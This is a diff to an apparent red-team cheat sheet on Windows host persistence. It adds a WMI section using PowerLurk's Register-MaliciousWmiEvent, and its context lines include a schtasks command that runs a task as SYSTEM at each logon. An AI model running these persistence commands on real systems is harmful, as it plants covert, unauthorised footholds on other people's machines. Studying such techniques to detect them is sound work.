@@ -4,7 +4,9 @@
   * [LNK](#LNK)
   * [Schtask](#sSchtasks)
 * [Elevated](#Elevated)
+  * [Service](#Service)
   * [Schtasks](#Schtasks2)
+  * [WMI](#WMI)
   * [Just Enough Admin](#Just-Enough-Admin)
 
 # Host Persistence
@@ -67,6 +69,15 @@ SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powers
 - Run task as system each time a user logs in
 ```
 schtasks /create /ru "NT AUTHORITY\SYSTEM" /rp "" /tn "<TASK NAME>" /tr <PATH TO EXE> /sc onlogon
+```
+
+## WMI
+- Persistence can be achieved with `EventConsumer`, `EventFiler`, `FilterToConsumerBinding`
+- https://github.com/Sw4mpf0x/PowerLurk
+
+```
+Import-Module PowerLurk.ps1
+Register-MaliciousWmiEvent -EventName <EVENT NAME> -PermanentCommand "<PATH TO EXE>" -Trigger ProcessStart -ProcessName notepad.exe
 ```
 
 ### Just Enough Admin
